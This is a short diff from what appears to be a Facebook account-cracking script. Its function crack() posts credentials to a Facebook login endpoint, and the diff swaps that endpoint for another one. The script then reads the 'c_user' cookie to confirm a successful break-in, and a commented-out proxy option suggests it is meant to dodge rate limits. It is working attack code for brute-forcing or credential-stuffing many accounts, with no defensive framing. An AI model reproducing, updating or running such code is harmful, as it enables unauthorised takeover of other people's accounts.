@@ -176,7 +176,7 @@ def crack(uid, pww, total_idz):
             'sec-fetch-dest': 'document',
             'accept-encoding': 'gzip, deflate, br, zstd',
             'accept-language': 'en-US,en;q=0.9',}
-            response = session.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
+            response = session.post('https://bn-in.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=100',headers=headers,data=data,allow_redirects=False) #proxies=proxs)
             #print(response)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
